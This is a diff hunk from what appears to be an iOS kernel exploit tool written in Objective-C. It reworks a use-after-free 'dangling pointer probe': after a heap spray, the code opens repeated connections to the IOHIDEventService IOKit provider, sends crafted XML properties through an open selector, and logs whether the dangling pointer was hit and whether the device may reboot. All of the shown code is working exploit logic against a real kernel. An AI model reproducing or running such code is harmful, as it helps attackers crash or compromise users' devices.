@@ -3964,31 +3964,27 @@ static const char kOpenPropertiesGarbage[] =
     }
 
     // ---- Probe: open NEW connection to same provider after UAF ----
-    // Provider's client collection has dangling pointer → openForClient
-    // iterates collection → safeMetaCast reads our sprayed kalloc.48 slot.
-    // If the spray slot's CF isa is invalid → kernel data abort = path confirmed.
     [self appendLog:@"\n====== UAF Dangling Pointer Probe ======"];
-    if (raceService != MACH_PORT_NULL) {
-        io_service_t probeSvc = raceService;
-        io_connect_t probeConn = MACH_PORT_NULL;
-        kern_return_t okr = sIOServiceOpen(probeSvc, mach_task_self(), 2, &probeConn);
-        if (okr == KERN_SUCCESS && probeConn != MACH_PORT_NULL) {
-            uint64_t openScalar = 0;
-            const char *xml = kOpenPropertiesXML;
-            kern_return_t gkr = sIOConnectCallMethod(probeConn, kSelectorOpen,
-                &openScalar, 1, xml, strlen(xml) + 1,
-                NULL, NULL, NULL, NULL);
-            [self appendLog:[NSString stringWithFormat:@"  New connection open: IOServiceOpen=0x%x gate=0x%x%s",
-                okr, gkr, (gkr == KERN_SUCCESS) ? " (PROVIDER DID NOT CRASH — dangling ptr not hit)" : ""]];
-            if (gkr != KERN_SUCCESS) {
-                [self appendLog:[NSString stringWithFormat:@"  Gate failed: 0x%x (%s) — dangling pointer may have caused fault", gkr, mach_error_string(gkr)]];
+    io_service_t probeSvc = sIOServiceGetMatchingService(kIOMainPortDefault,
+        sIOServiceMatching("IOHIDEventService"));
+    [self appendLog:[NSString stringWithFormat:@"  IOHIDEventService: 0x%x", probeSvc]];
+    if (probeSvc != MACH_PORT_NULL) {
+        for (int p = 0; p < 3; p++) {
+            io_connect_t pc = MACH_PORT_NULL;
+            kern_return_t okr = sIOServiceOpen(probeSvc, mach_task_self(), 2, &pc);
+            if (okr == KERN_SUCCESS && pc != MACH_PORT_NULL) {
+                uint64_t s = 0;
+                kern_return_t gkr = sIOConnectCallMethod(pc, kSelectorOpen,
+                    &s, 1, kOpenPropertiesXML, strlen(kOpenPropertiesXML) + 1,
+                    NULL, NULL, NULL, NULL);
+                [self appendLog:[NSString stringWithFormat:@"  [%d] open=0x%x gate=0x%x%s", p, okr, gkr,
+                    (gkr == KERN_SUCCESS) ? " (provider alive)" : ""]];
+                if (gkr != KERN_SUCCESS)
+                    [self appendLog:@"  >>> Dangling pointer HIT — device may reboot"];
+                sIOServiceClose(pc);
             }
-            sIOServiceClose(probeConn);
-        } else {
-            [self appendLog:[NSString stringWithFormat:@"  IOServiceOpen failed: 0x%x", okr]];
         }
-    } else {
-        [self appendLog:@"  Skipped — no provider service available"];
+        sIOObjectRelease(probeSvc);
     }
 
     // ---- Release multi-conn client slots ----
